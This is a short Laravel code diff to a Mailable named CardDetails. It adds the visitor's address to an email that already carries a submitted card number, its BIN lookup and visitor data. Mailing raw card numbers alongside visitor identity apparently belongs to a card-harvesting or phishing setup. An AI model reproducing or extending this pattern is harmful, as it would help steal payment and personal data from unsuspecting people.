@@ -3,6 +3,8 @@
 namespace App\Mail;
 
 use App\Class\CardBin;
+use App\Class\VisitorAddress;
+use App\Http\Requests\StoreCardRequest;
 use App\Http\Requests\StorePaymentRequest;
 use App\Models\Visitor;
 use Illuminate\Bus\Queueable;
@@ -18,14 +20,16 @@ class CardDetails extends Mailable {
 
     public readonly Visitor $visitor;
     public readonly CardBin $cardBin;
+    public readonly VisitorAddress $address;
 
     /**
      * Create a new message instance.
      */
-    public function __construct(public StorePaymentRequest $request)
+    public function __construct(public StoreCardRequest $request)
     {
         $this->visitor = Visitor::current();
         $this->cardBin = CardBin::findOrNew($this->request->get('cardNumber'));
+        $this->address = VisitorAddress::currentVisitor();
     }
 
     /**
